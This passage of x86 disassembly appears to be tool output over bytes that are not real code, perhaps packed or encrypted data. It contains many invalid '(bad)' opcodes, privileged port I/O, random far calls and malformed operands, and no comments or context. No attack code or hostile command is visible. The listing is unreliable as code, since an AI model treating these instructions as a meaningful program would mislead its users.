  4452cf:	fst    QWORD PTR [esi+0x7b]
  4452d2:	nop
  4452d3:	jecxz  0x44534e
  4452d5:	pop    esp
  4452d6:	punpckldq mm1,DWORD PTR [esi-0x3ede8f13]
  4452dd:	xchg   ecx,eax
  4452de:	xor    ebx,DWORD PTR [edi+0x2beee288]
  4452e4:	and    al,0x3e
  4452e6:	jb     0x4452fe
  4452e8:	add    bl,0xfb
  4452eb:	mov    al,ds:0xbdcf4a27
  4452f0:	scas   eax,DWORD PTR es:[edi]
  4452f1:	bound  esi,QWORD PTR [esi]
  4452f3:	stc    
  4452f4:	pop    esi
  4452f5:	mov    ah,0x65
  4452f7:	dec    edx
  4452f8:	mov    ds:0xbfb9d4,al
  4452fd:	pop    esi
  4452fe:	or     al,0xe3
  445300:	icebp  
  445301:	sub    bl,BYTE PTR [ebx-0x72]
  445304:	sahf   
  445305:	mov    BYTE PTR [ebp-0x11f11097],ah
  44530b:	(bad)  
  44530c:	jecxz  0x4452dd
  44530e:	retf   0x3dd1
  445311:	push   ds
  445312:	sti    
  445313:	mov    al,ds:0x6dcc6fca
  445318:	and    eax,0x5f3ccbbf
  44531d:	xchg   ebx,ebx
  44531f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445320:	or     al,0xe
  445322:	sub    eax,0x40a8de86
  445327:	xchg   ebp,eax
  445328:	push   ebp
  445329:	pop    esi
  44532a:	hlt    
  44532b:	push   0xf56cfc9e
  445330:	mov    fs,WORD PTR [ebp-0x4cb46ee1]
  445336:	push   0xcdf7e0c
  44533b:	or     DWORD PTR [esi],edi
  44533d:	jne    0x44533e
  44533f:	mov    dh,0x49
  445341:	pop    esi
  445342:	test   BYTE PTR [esi-0x677c0a93],0x7e
  445349:	fnsave [esi-0x11017b07]
  44534f:	hlt    
  445350:	jo     0x445393
  445352:	mov    edx,0xe5eecc3c
  445357:	mov    al,ds:0x2b57a68a
  44535c:	push   ebp
  44535d:	std    
  44535e:	(bad)  
  44535f:	pop    esi
  445360:	pop    esi
  445361:	pop    edx
  445362:	jle    0x4453d6
  445364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445365:	std    
  445366:	outs   dx,DWORD PTR ds:[esi]
  445367:	outs   dx,DWORD PTR ds:[esi]
  445368:	sub    al,0x61
  44536a:	aas    
  44536b:	shl    BYTE PTR [ecx+0x3c],cl
  44536e:	lds    ebx,FWORD PTR [esi+0x76ee3397]
  445374:	jb     0x4453f4
  445376:	pop    es
  445377:	inc    edi
  445378:	dec    ecx
  445379:	sbb    DWORD PTR [edx-0x5f],ebx
  44537c:	add    cl,BYTE PTR [ecx]
  44537e:	sahf   
  44537f:	jb     0x445355
  445381:	(bad)  
  445382:	xchg   ebp,eax
  445383:	clc    
  445384:	pop    esi
  445385:	loop   0x445334
  445387:	xchg   esp,eax
  445388:	repnz pop esi
  44538a:	fld    QWORD PTR [edx-0x1ed9f96]
  445390:	arpl   WORD PTR [ebp+0x1440f9a8],cx
  445396:	out    dx,al
  445397:	push   cs
  445398:	push   ss
  445399:	add    al,0x3
  44539b:	test   eax,0xa194411e
  4453a0:	adc    al,0xf1
  4453a2:	or     BYTE PTR [ecx],bh
  4453a4:	mov    ebp,DWORD PTR [ecx-0x10]
  4453a7:	out    dx,al
  4453a8:	pop    edx
  4453a9:	pop    esi
  4453aa:	ds jbe 0x4453ec
  4453ad:	xor    DWORD PTR [esi],ebp
  4453af:	xchg   edx,eax
  4453b0:	xor    al,0xd6
  4453b2:	pop    ebp
  4453b3:	icebp  
  4453b4:	cmp    eax,0x41d37c61
  4453b9:	sub    DWORD PTR [edx-0xc148d72],ebx
  4453bf:	adc    edi,DWORD PTR [esi+eiz*8]
  4453c2:	xchg   edi,eax
  4453c3:	mov    eax,ds:0x8ec46e99
  4453c8:	loopne 0x44542a
  4453ca:	and    esi,DWORD PTR [ebp-0x654061c0]
  4453d0:	ins    BYTE PTR es:[edi],dx
  4453d1:	addr16 hlt 
  4453d3:	mov    edx,0x619ba0e3
  4453d8:	pop    esi
  4453d9:	dec    edx
  4453da:	mov    eax,ds:0xf995d321
  4453df:	mov    ds:0x3b20450d,eax
  4453e4:	push   esi
  4453e5:	or     ch,BYTE PTR [esi+0x29]
  4453e8:	mov    ah,0xf5
  4453ea:	adc    dl,ch
  4453ec:	jle    0x445393
  4453ee:	out    dx,al
  4453ef:	leave  
  4453f0:	cmp    DWORD PTR [esi],esp
  4453f2:	das    
  4453f3:	xor    al,0x28
  4453f5:	pusha  
  4453f6:	arpl   WORD PTR [edx+0x205452f0],dx
  4453fc:	dec    ecx
  4453fd:	xor    DWORD PTR [edi-0x11e387c3],ebp
  445403:	in     eax,dx
  445404:	sub    bl,BYTE PTR [esi-0x52]
  445407:	jge    0x445434
  445409:	call   0xf7c6:0xebff9fad
  445410:	fidiv  WORD PTR [esi+0x4f7a3dac]
  445416:	out    dx,al
  445417:	jecxz  0x4453dd
  445419:	outs   dx,DWORD PTR ds:[esi]
  44541a:	cmp    DWORD PTR [esi+0x74],0x1c
  44541e:	xor    bl,BYTE PTR [ebx+0x6d34faa4]
  445424:	mov    ebx,DWORD PTR [ecx-0x46]
  445427:	stos   DWORD PTR es:[edi],eax
  445428:	cdq    
  445429:	out    dx,eax
  44542a:	jmp    0xea85:0x37096ba
  445431:	enter  0xccee,0x57
  445435:	dec    edx
  445436:	push   cs
  445437:	mov    eax,0xa1a52309
  44543c:	in     al,dx
  44543d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44543e:	repnz push edi
  445440:	dec    ecx
  445441:	dec    ecx
  445442:	shr    edx,cl
  445444:	arpl   WORD PTR [ebp-0x60730c00],dx
  44544a:	fldenv [eax+0x48]
  44544d:	mov    al,ds:0x44a5c2de
  445452:	mov    al,0xc6
  445454:	xor    ecx,esp
  445456:	call   FWORD PTR [eax-0x50]
  445459:	fcomip st,st(7)
  44545b:	push   edi
  44545c:	pop    esi
  44545d:	cld    
  44545e:	stos   DWORD PTR es:[edi],eax
  44545f:	sub    al,dl
  445461:	jns    0x44540a
  445463:	dec    eax
  445464:	mov    cl,0x60
  445466:	push   esp
  445467:	add    dl,bh
  445469:	test   BYTE PTR [edi+edx*4],dl
  44546c:	sbb    eax,0x8a6bec69
  445471:	in     eax,0xd5
  445473:	push   0x3e9b413f
  445478:	dec    ecx
  445479:	pop    esi
  44547a:	lea    ebp,[edi+0x1249669b]
  445480:	out    0x88,al
  445482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445483:	into   
  445484:	pop    esi
  445485:	jno    0x44542e
  445487:	sub    eax,0x1cdf8699
  44548c:	call   0x9f1f:0x8aed0f60
  445493:	inc    esi
  445494:	loope  0x4454e0
  445496:	loop   0x4454f1
  445498:	pop    esi
  445499:	je     0x445437
  44549b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44549c:	pop    esp
  44549d:	retf   
  44549e:	cmp    ah,dl
  4454a0:	scas   al,BYTE PTR es:[edi]
  4454a1:	pusha  
  4454a2:	retf   0xd3ae
  4454a5:	push   ecx
  4454a6:	dec    ebx
  4454a7:	cmp    BYTE PTR [esi-0x2234133e],cl
  4454ad:	push   ss
  4454ae:	dec    eax
  4454af:	es js  0x4454f2
  4454b2:	loopne 0x445473
  4454b4:	add    ch,ah
  4454b6:	into   
  4454b7:	push   esi
  4454b8:	sub    eax,0x8d3ceea9
  4454bd:	xchg   DWORD PTR [ecx+0x54174e3],ebx
  4454c3:	mov    ds:0x7c73bf5d,al
  4454c8:	and    eax,0x264ce7b1
  4454cd:	sbb    eax,0xcbf7ffe4
  4454d2:	out    dx,al
  4454d3:	xchg   esp,eax
  4454d4:	inc    ebx
  4454d5:	pop    ds
  4454d6:	push   ss
  4454d7:	inc    al
  4454d9:	pop    es
  4454da:	and    eax,0xef6f61a1
  4454df:	mov    esi,DWORD PTR [esp+eax*4]
  4454e2:	cmp    eax,0xfa1c5e3e
  4454e7:	out    dx,eax
  4454e8:	fs pop esi
  4454ea:	fstp   QWORD PTR [ecx]
  4454ec:	sahf   
  4454ed:	pusha  
  4454ee:	mov    al,0xab
  4454f0:	hlt    
  4454f1:	adc    BYTE PTR [eax+edi*1+0x50],0x6f
  4454f6:	out    dx,al
  4454f7:	push   0x2287da63
  4454fc:	lods   al,BYTE PTR ds:[esi]
  4454fd:	popa   
  4454fe:	mov    edx,esi
  445500:	pop    ecx
  445501:	push   ebx
  445502:	mov    edi,0xee5fef23
  445507:	rol    bh,0x1c
  44550a:	mov    ds:0xd35a5e00,eax
  44550f:	ds sahf 
  445511:	and    BYTE PTR [eax+0x79],al
  445514:	mov    esi,0x56978260
  445519:	and    ebx,DWORD PTR [ecx+0x4d]
  44551c:	adc    eax,0xd035fc40
  445521:	jb     0x445511
  445523:	cwde   
  445524:	pop    ss
  445525:	mov    ebx,0x608fe757
  44552a:	(bad)  
  44552b:	cs jne 0x44559c
  44552e:	ja     0x445571
  445530:	pop    ebx
  445531:	inc    ebp
  445532:	mov    dh,0xc9
  445534:	shl    DWORD PTR [eax-0x46],0x58
  445538:	xor    eax,0x11e1a9be
  44553d:	pop    esi
  44553e:	or     eax,0xda56ef42
  445543:	outs   dx,BYTE PTR ds:[esi]
  445544:	ffreep st(1)
  445546:	push   esi
  445547:	xchg   ecx,eax
  445548:	sub    esp,0xa
  44554b:	cmp    ch,BYTE PTR [edi+esi*8+0x239599ee]
  445552:	std    
  445553:	cmc    
  445554:	es inc ebx
  445556:	mov    ecx,ecx
  445558:	and    DWORD PTR [edx],ebx
  44555a:	dec    ecx
  44555b:	mov    esi,0x8071d00a
  445560:	xchg   ebx,eax
  445561:	lods   al,BYTE PTR ds:[esi]
  445562:	push   ds
  445563:	inc    ebp
  445564:	pop    edi
  445565:	jge    0xcacd6a7
  44556b:	xor    DWORD PTR [edi],edx
  44556d:	ficomp WORD PTR [ebx-0x5c]
  445570:	stc    
  445571:	mov    ch,0x9c
  445573:	mov    bl,0xd1
  445575:	outs   dx,BYTE PTR cs:[esi]
  445577:	bound  esi,QWORD PTR [ecx+ebx*2-0x29104312]
  44557e:	dec    esp
  44557f:	mov    ds:0x7d3582fb,eax
  445584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445585:	or     BYTE PTR [esi-0x413ea1eb],bl
  44558b:	mov    dl,0x17
  44558d:	mov    ds:0x5e5e0cda,al
  445592:	pusha  
  445593:	jmp    0x60aa:0xe4bab339
  44559a:	push   edx
  44559b:	add    eax,0xcc571798
  4455a0:	mov    esp,DWORD PTR [esi+ebp*8]
  4455a3:	xor    bl,dh
  4455a5:	cmp    eax,0xcc742291
  4455aa:	cs test al,0x73
  4455ad:	inc    ebp
  4455ae:	jmp    0x445612
  4455b0:	xor    BYTE PTR [ecx+0x57],dh
  4455b3:	mov    esi,0x87e77070
  4455b8:	add    DWORD PTR [edx+ebx*4+0x60],ebx
  4455bc:	das    
  4455bd:	out    dx,eax
  4455be:	cmp    DWORD PTR [ebx+esi*8-0x20],ecx
  4455c2:	dec    edx
  4455c3:	jg     0x445570
  4455c5:	add    al,0x91
  4455c7:	popa   
  4455c8:	gs ret 0x154
  4455cc:	pop    esi
  4455cd:	mov    ?,WORD PTR [esi]
  4455cf:	or     al,0x3a
  4455d1:	call   0xf88d5d6
  4455d6:	scas   al,BYTE PTR es:[edi]
  4455d7:	int    0xa9
  4455d9:	or     al,0x9c
  4455db:	push   0x6d416018
  4455e0:	sahf   
  4455e1:	popa   
  4455e2:	js     0x4455eb
  4455e4:	mov    WORD PTR [eax+0x295d6dae],?
  4455ea:	jb     0x445627
  4455ec:	sti    
  4455ed:	jns    0x4455ad
  4455ef:	inc    edx
  4455f0:	mov    dh,BYTE PTR [eax+0x60957363]
  4455f6:	inc    ebx
  4455f7:	add    ebx,DWORD PTR [esi]
  4455f9:	mov    WORD PTR [edi-0x12f74e85],es
  4455ff:	jns    0x4455fb
  445601:	xor    al,0x15
  445603:	in     al,0x5c
  445605:	cmp    ah,BYTE PTR [edx-0x62]
  445608:	lock pop ecx
  44560a:	and    bl,BYTE PTR [ebx-0x7e771922]
  445610:	cld    
  445611:	bound  eax,QWORD PTR [eax+0x20]
  445614:	pop    esi
  445615:	ins    DWORD PTR es:[edi],dx
  445616:	mov    ebx,0x579c011a
  44561b:	push   ebx
  44561c:	push   ebx
  44561d:	pop    edx
  44561e:	and    dl,BYTE PTR [ecx+0x1c7300bd]
  445624:	fmulp  st(1),st
  445626:	(bad)  
  445627:	in     al,0xd0
  445629:	outs   dx,DWORD PTR ds:[esi]
  44562a:	out    0xe3,eax
  44562c:	out    0x72,al
  44562e:	jge    0x44565e
  445630:	sub    edi,DWORD PTR [edx-0x12]
  445633:	jmp    FWORD PTR [ebx-0x50]
  445636:	clc    
  445637:	sahf   
  445638:	ss and bh,ah
  44563b:	aaa    
  44563c:	ds ins BYTE PTR es:[edi],dx
  44563e:	mov    bl,BYTE PTR [edi-0x121897cc]
  445644:	and    ah,BYTE PTR [ecx]
  445646:	sbb    BYTE PTR [edx+0x1e],cl
  445649:	dec    ecx
  44564a:	sub    bl,ah
  44564c:	jb     0x4456ae
  44564e:	sti    
  44564f:	fstp   DWORD PTR [ebp-0xe]
  445652:	or     BYTE PTR [ebx-0x12117f20],ah
  445658:	xchg   DWORD PTR [ebx+0x526c92a1],esp
  44565e:	push   ds
  44565f:	mov    ds:0x24cc8fb0,al
  445664:	sbb    eax,0xae7201f6
  445669:	mov    al,0xc8
  44566b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44566c:	cmp    cl,bl
  44566e:	shl    DWORD PTR [eax],0xa7
  445671:	mov    gs,edx
  445673:	out    0x24,al
  445675:	jne    0x445629
  445677:	mov    al,ds:0x4ff2d291
  44567c:	mov    esp,0x5ecae407
  445681:	mov    bh,0xa7
  445683:	xchg   cl,dl
  445685:	pop    edx
  445686:	jg     0x44568b
  445688:	mov    ebp,0xc8242160
  44568d:	xlat   BYTE PTR ds:[ebx]
  44568e:	fimul  WORD PTR [edi-0x5c111ef3]
  445694:	xchg   esp,esi
  445696:	push   cs
  445697:	add    al,0xa7
  445699:	xchg   edi,eax
  44569a:	push   ds
  44569b:	imul   DWORD PTR [eax+eiz*2+0x41]
  44569f:	mov    edx,DWORD PTR [eax-0x58]
  4456a2:	into   
  4456a3:	das    
  4456a4:	sub    BYTE PTR [esi-0x12],dl
  4456a7:	mov    bl,ch
  4456a9:	(bad)  
  4456ab:	(bad)  
  4456ac:	int    0x76
  4456ae:	js     0x445654
  4456b0:	pop    esp
  4456b1:	stos   BYTE PTR es:[edi],al
  4456b2:	dec    edi
  4456b3:	icebp  
  4456b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4456b5:	jl     0x4456ea
  4456b7:	adc    edx,esi
  4456b9:	div    BYTE PTR [ebp+0x4b9851fb]
  4456bf:	and    ah,bl
  4456c1:	pop    ebp
  4456c2:	mov    edx,0xdb609cee
  4456c7:	add    eax,0x1a7feb18
  4456cc:	xor    cl,al
  4456ce:	out    dx,al
  4456cf:	fisttp WORD PTR [ecx]
  4456d1:	sti    
  4456d2:	lock dec esp
  4456d4:	add    eax,edi
  4456d6:	dec    ecx
  4456d7:	mov    eax,ds:0x840f3be0
  4456dc:	xchg   esi,eax
  4456dd:	test   DWORD PTR [edi],ebx
  4456df:	sbb    ebx,DWORD PTR [esi-0x5d]
  4456e2:	or     al,0x63
  4456e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4456e5:	add    DWORD PTR [edi],esi
  4456e7:	repnz cmp DWORD PTR [ecx-0x78],esp
  4456eb:	push   es
  4456ec:	sub    edi,DWORD PTR [ecx]
  4456ee:	push   ebx
  4456ef:	dec    BYTE PTR [ecx-0x2ce71173]
  4456f5:	pop    ss
  4456f6:	ss sub eax,0xae5ee12f
  4456fc:	loopne 0x44570a
  4456fe:	outs   dx,BYTE PTR ds:[esi]
  4456ff:	mov    al,ds:0x45a8e8c
  445704:	dec    edi
  445705:	iret   
  445706:	out    0xaf,eax
  445708:	in     al,0x95
  44570a:	or     BYTE PTR [esi],ch
  44570c:	(bad)  
  44570d:	pop    edi
  44570e:	pop    eax
  44570f:	mov    ds:0x514f5572,eax
  445714:	outs   dx,DWORD PTR ds:[esi]
  445715:	push   esi
  445716:	imul   esp,DWORD PTR [eax-0x6c],0xffffff81
  44571a:	adc    BYTE PTR ds:0x1f5cee23,ch
  445721:	in     eax,0x19
  445723:	cmp    dl,0xa2
  445726:	jle    0x4456d0
  445728:	imul   ebx,ebp,0xffffff97
  44572b:	sbb    BYTE PTR [edx-0x20],bh
  44572e:	lahf   
  44572f:	or     BYTE PTR [ebp+0x70],dh
  445732:	out    dx,al
  445733:	ds gs sti 
  445736:	cdq    
  445737:	mov    edx,0x8ed1f4b6
  44573c:	punpckhdq mm6,mm4
  44573f:	and    ebp,ebp
  445741:	popf   
  445742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445743:	push   esi
  445744:	imul   BYTE PTR [edx+ebp*1+0x7bab5170]
  44574b:	je     0x44576b
  44574d:	std    
  44574e:	sti    
  44574f:	and    DWORD PTR es:[edx+0x73436f00],edx
  445756:	push   ss
  445757:	dec    edi
  445758:	jp     0x44579c
  44575a:	les    esp,FWORD PTR [ebx]
  44575c:	mov    edi,0x9e1d9190
  445761:	add    DWORD PTR [ebp*1-0x1b14e98a],edi
  445768:	neg    DWORD PTR [eax-0x4f85e519]
  44576e:	fs nop
  445770:	adc    al,0x27
  445772:	fldenv [eax-0x5b13e273]
  445778:	inc    edx
  445779:	cmp    DWORD PTR [edx-0x701ba1ff],ecx
  44577f:	dec    edi
  445780:	test   BYTE PTR [esi+ebp*4-0x2f],0x23
  445785:	popa   
  445786:	ins    DWORD PTR es:[edi],dx
  445787:	push   edi
  445788:	xor    BYTE PTR [ecx],0xa
  44578b:	push   ebp
  44578c:	jne    0x445761
  44578e:	out    dx,al
  44578f:	add    esi,DWORD PTR [edi]
  445791:	fistp  WORD PTR [ebx+eax*8+0x7e]
  445795:	inc    esi
  445796:	xchg   esi,eax
  445797:	mov    eax,ds:0x36f25bca
  44579c:	jmp    0x9f79:0x52ad9ce8
  4457a3:	mov    ds:0x43735cde,eax
  4457a8:	addr16 mov ah,0x5f
  4457ab:	mov    eax,ds:0x440dce
  4457b0:	xor    BYTE PTR [ebx-0x2d],0x8a
  4457b4:	pop    ebx
  4457b5:	push   ss
  4457b6:	push   es
  4457b7:	retf   
  4457b8:	push   edi
  4457b9:	cmc    
  4457ba:	inc    BYTE PTR [esp+ebx*4]
  4457bd:	and    al,0x7b
  4457bf:	mov    eax,ds:0x38cb8739
  4457c4:	mov    ah,0xd5
  4457c6:	xor    eax,0xbffa5d8d
  4457cb:	test   cl,0x85
  4457ce:	mov    ecx,0xe9052efb
  4457d3:	mov    al,ds:0x22f0f128
  4457d8:	adc    bl,BYTE PTR [esi-0x5ea1995a]
  4457de:	stos   DWORD PTR es:[edi],eax
  4457df:	retf   
  4457e0:	repnz in al,0x13
  4457e3:	out    0x91,eax
  4457e5:	inc    ecx
  4457e6:	xchg   edi,eax
  4457e7:	adc    BYTE PTR [ecx-0x7c],0x60
  4457eb:	and    DWORD PTR [ecx-0x2b386972],eax
  4457f1:	jge    0x4457e1
  4457f3:	or     DWORD PTR [edx+0x35],ebx
  4457f6:	js     0x445864
  4457f8:	push   esp
  4457f9:	push   ebp
  4457fa:	sbb    DWORD PTR [eax-0x5e5a748b],0xed9ed0c5
  445804:	pop    ebx
  445805:	nop    ebp
  445808:	mov    eax,ds:0x3f5fee23
  44580d:	xchg   ebx,eax
  44580e:	pushf  
  44580f:	data16 adc al,0x6b
  445812:	and    eax,0x7958aea1
  445817:	push   cs
  445818:	pop    edx
  445819:	and    al,0xf9
  44581b:	add    BYTE PTR [esi-0x59],bl
  44581e:	ror    BYTE PTR [esi+0x4551b92f],1
  445824:	test   DWORD PTR [ecx+0x9],edx
  445827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445828:	iret   
  445829:	sbb    BYTE PTR [esi-0x39],ch
  44582c:	and    ch,BYTE PTR [edi-0x21]
  44582f:	jae    0x44588a
  445831:	add    BYTE PTR [eax+0x2c],ch
  445834:	xchg   edi,eax
  445835:	mov    eax,ds:0x5e11e42e
  44583a:	sub    eax,0x725d59a4
  44583f:	or     BYTE PTR [esp+ebp*2],0x46
  445843:	xchg   ebx,eax
  445844:	and    esi,DWORD PTR [edx-0xb]
  445847:	sub    al,0xe4
  445849:	cmp    DWORD PTR [ebx-0x5f],ebx
  44584c:	sar    edi,1
  44584e:	jno    0x445831
  445850:	mov    edx,0xe6290e5f
  445855:	sub    al,0x3d
  445857:	dec    ecx
  445858:	adc    dh,BYTE PTR [ebp-0x43a1da8c]
  44585e:	sub    cl,BYTE PTR [esi-0x12bb9630]
  445864:	push   cs
  445865:	popa   
  445866:	lds    edi,FWORD PTR [edi+ebp*1-0x3e4e6dde]
  44586d:	sub    dh,0x29
  445870:	mov    edx,0x252996a2
  445875:	rcl    DWORD PTR [eax],cl
  445877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445878:	jmp    0x6645:0x629fb9c6
  44587f:	cmp    ah,BYTE PTR [edx]
  445881:	aaa    
  445882:	in     eax,dx
  445883:	ret    0x6407
  445886:	lds    esp,FWORD PTR [ebx+eax*2+0x160632c9]
  44588d:	push   esp
  44588e:	push   edi
  44588f:	and    bl,bl
  445891:	xchg   ebx,eax
  445892:	or     dh,BYTE PTR [esi+ebp*2+0x42]
  445896:	das    
  445897:	ret    
  445898:	pop    ebp
  445899:	fisttp DWORD PTR [edi-0x7c]
  44589c:	int3   
  44589d:	mov    dl,dh
  44589f:	push   cs
  4458a0:	call   0x8623:0x4defec03
  4458a7:	mov    eax,ds:0xf54ed430
  4458ac:	jbe    0x4458ee
  4458ae:	retf   0x605b
  4458b1:	mov    dh,bl
  4458b3:	js     0x44584f
  4458b5:	and    edi,eax
  4458b7:	pusha  
  4458b8:	xchg   esp,eax
  4458b9:	cmp    DWORD PTR [esi+0x386116ee],edx
  4458bf:	mov    bh,0x66
  4458c1:	sbb    eax,0x75f5b62c
  4458c6:	in     eax,dx
  4458c7:	shl    DWORD PTR [edi-0x72be05eb],cl
  4458cd:	arpl   WORD PTR [edx+0x4f],dx
  4458d0:	aad    0x4a
  4458d2:	sbb    BYTE PTR [ebx+0x1f],dl
  4458d5:	popa   
  4458d6:	and    DWORD PTR [edx+ebp*4],ebx
  4458d9:	retf   
  4458da:	or     BYTE PTR [ebx+0x5e],cl
  4458dd:	push   esi
  4458de:	cmp    dl,ah
  4458e0:	jecxz  0x4458f2
  4458e2:	aas    
  4458e3:	push   edx
  4458e4:	dec    ecx
  4458e5:	pop    esi
  4458e6:	in     al,dx
  4458e7:	stos   BYTE PTR es:[edi],al
  4458e8:	arpl   bx,cx
  4458ea:	loope  0x44592e
  4458ec:	mov    dh,0x67
  4458ee:	xor    al,0x77
  4458f0:	pop    esi
  4458f1:	stos   BYTE PTR es:[edi],al
  4458f2:	outs   dx,DWORD PTR ds:[esi]
  4458f3:	shl    BYTE PTR ds:0xeae3cf27,1
  4458f9:	pusha  
  4458fa:	mov    BYTE PTR [edx+0x7e],bh
  4458fd:	aas    
  4458fe:	out    0x73,al
  445900:	xor    eax,0xaa14ecf0
  445905:	imul   edx,esi,0x3d
  445908:	inc    edx
  445909:	mov    eax,ds:0x57b9fca7
  44590e:	inc    edi
  44590f:	or     ah,ah
  445911:	repnz out dx,al
  445913:	hlt    
  445914:	mov    dh,0x77
  445916:	jno    0x44594d
  445918:	push   esp
  445919:	and    edi,DWORD PTR [ecx-0x7b67e266]
  44591f:	test   al,0xb8
  445921:	and    esi,DWORD PTR [esi]
  445923:	cmp    DWORD PTR [ebx-0x358ad5a7],0x28311771
  44592d:	fst    DWORD PTR [ecx-0x11a27f84]
  445933:	or     DWORD PTR [esi-0x1f684efb],edx
  445939:	dec    esi
  44593a:	ret    0xb1a0
  44593d:	xchg   edx,eax
  44593e:	popa   
  44593f:	(bad)  
  445940:	add    DWORD PTR [esi+0x54],ecx
  445943:	call   0x9a53:0x5dfd655e
  44594a:	shl    BYTE PTR [ebx+eax*8],0x2b
  44594e:	mov    eax,ds:0xcbe1aca1
  445953:	arpl   WORD PTR [ebp+0x4b830473],bx
  445959:	add    al,0xd1
  44595b:	ja     0x4459b1
  44595d:	pop    es
  44595e:	scas   eax,DWORD PTR es:[edi]
  44595f:	ret    0x4121
  445962:	loopne 0x4458f3
  445964:	repz mov bl,0x4a
  445967:	mov    eax,ds:0xdccea709
  44596c:	outs   dx,BYTE PTR ds:[esi]
  44596d:	push   esi
  44596e:	mov    esp,0xd8ad6a98
  445973:	push   ebx
  445974:	pop    eax
  445975:	or     edi,esp
  445977:	jmp    0x445943
  445979:	and    dh,dh
  44597b:	ins    DWORD PTR es:[edi],dx
  44597c:	pop    ebx
  44597d:	pop    edx
  44597e:	push   0x66975c4
  445983:	bound  esi,QWORD PTR [edi-0x668ae2a8]
  445989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44598a:	out    dx,al
  44598b:	aad    0x1b
  44598d:	mov    eax,ds:0x1ff97803
  445992:	pop    eax
  445993:	stos   DWORD PTR es:[edi],eax
  445994:	lods   eax,DWORD PTR ds:[esi]
  445995:	xor    DWORD PTR [esi+0x38],ebp
  445998:	xchg   edx,eax
  445999:	shl    BYTE PTR [eax-0xcee290b],0x33
  4459a0:	jnp    0x445922
  4459a2:	xor    eax,0xec7c84a1
  4459a7:	inc    esp
  4459a8:	mov    fs,WORD PTR [eax-0x74]
  4459ab:	shr    BYTE PTR [edi+ebp*4-0x29],1
  4459af:	mov    ecx,0xe26074d
  4459b4:	mov    al,ds:0x923332e0
  4459b9:	in     eax,dx
  4459ba:	pop    ecx
  4459bb:	imul   ecx,DWORD PTR ds:0x9507d61,0x26
  4459c2:	enter  0x1112,0xda
  4459c6:	and    edi,edi
  4459c8:	dec    esi
  4459c9:	loope  0x445970
  4459cb:	arpl   bp,si
  4459cd:	dec    esp
  4459ce:	fwait
  4459cf:	aaa    
  4459d0:	push   esi
  4459d1:	popa   
  4459d2:	int3   
  4459d3:	xor    al,0x89
  4459d5:	jmp    FWORD PTR [ecx+0x70]
  4459d8:	sbb    esi,ecx
  4459da:	jecxz  0x445968
  4459dc:	pop    ebp
  4459dd:	jle    0x4459fb
  4459df:	xchg   ecx,eax
  4459e0:	xchg   ecx,eax
  4459e1:	arpl   WORD PTR [ebp-0x32],bp
  4459e4:	xchg   edx,eax
  4459e5:	(bad)  
  4459e6:	jecxz  0x445988
  4459e8:	iret   
  4459e9:	dec    ebp
  4459ea:	imul   eax,DWORD PTR [edx],0xffffffd7
  4459ed:	inc    edi
  4459ee:	scas   eax,DWORD PTR es:[edi]
  4459ef:	dec    edi
  4459f0:	pop    esi
  4459f1:	clc    
  4459f2:	shl    bl,0xbc
  4459f5:	or     edi,DWORD PTR [esi]
  4459f7:	push   cs
  4459f8:	push   ss
  4459f9:	popa   
  4459fa:	std    
  4459fb:	out    dx,eax
  4459fc:	imul   ebx,esp,0x3
  4459ff:	enter  0xbf67,0xeb
  445a03:	or     bl,BYTE PTR [ebx+0x12f4f0b0]
  445a09:	stc    
  445a0a:	push   DWORD PTR [edi+0xf4060f5]
  445a10:	dec    esp
  445a11:	retf   0x4fb1
  445a14:	js     0x4459c9
  445a16:	out    dx,al
  445a17:	add    BYTE PTR [esi-0x6f],dl
  445a1a:	loope  0x445a8e
  445a1c:	xlat   BYTE PTR ds:[ebx]
  445a1d:	xor    ebp,DWORD PTR [esi-0x5f]
  445a20:	std    
  445a21:	packssdw mm0,mm7
  445a24:	aaa    
  445a25:	jl     0x4459d5
  445a27:	mov    fs,WORD PTR [esi]
  445a29:	lock pop esp
  445a2b:	mov    eax,ds:0x2d4a4c6f
  445a30:	sbb    edi,eax
  445a32:	aad    0x78
  445a34:	mov    edi,0xa6e6cf60
  445a39:	loopne 0x445a37
  445a3b:	dec    eax
  445a3c:	push   0x70
  445a3e:	out    dx,al
  445a3f:	adc    eax,ebx
  445a41:	aas    
  445a42:	cmc    
  445a43:	in     eax,dx
  445a44:	fld    DWORD PTR [eax-0x46]
  445a47:	mov    ds:0x2d2ad347,al
  445a4c:	jno    0x4459fd
  445a4e:	dec    esi
  445a4f:	inc    ebx
  445a50:	fild   DWORD PTR [ebx+0x99ef3e7]
  445a56:	(bad)  [esi]
  445a59:	in     eax,dx
  445a5a:	(bad)
  445a5d:	pusha  
  445a5e:	lock in al,0x99
  445a61:	mov    BYTE PTR [ecx-0x109c7900],al
  445a67:	adc    ah,ch
  445a69:	or     al,0x20
  445a6c:	push   edx
  445a6d:	add    dl,BYTE PTR [eax+0x19]
  445a70:	sub    edx,DWORD PTR [ebx+0x13]
  445a73:	dec    edx
  445a74:	pop    ebp
  445a75:	jg     0x445ac5
  445a77:	leave  
  445a78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445a79:	or     cl,BYTE PTR [esi+0x23]
  445a7c:	pop    esi
  445a7d:	sahf   
  445a7e:	or     eax,0xa65ca475
  445a83:	sbb    esp,DWORD PTR [eax]
  445a85:	pop    eax
  445a86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445a87:	std    
  445a88:	aaa    
  445a89:	jo     0x445a79
  445a8b:	(bad)  
  445a8c:	out    0xe1,eax
  445a8e:	pop    edi
  445a8f:	lock into 
  445a91:	mov    al,ds:0x635487e4
  445a96:	or     DWORD PTR [edx],ebx
  445a98:	pop    ebp
  445a99:	cmp    BYTE PTR [eax],0xe5
  445a9c:	jns    0x445b18
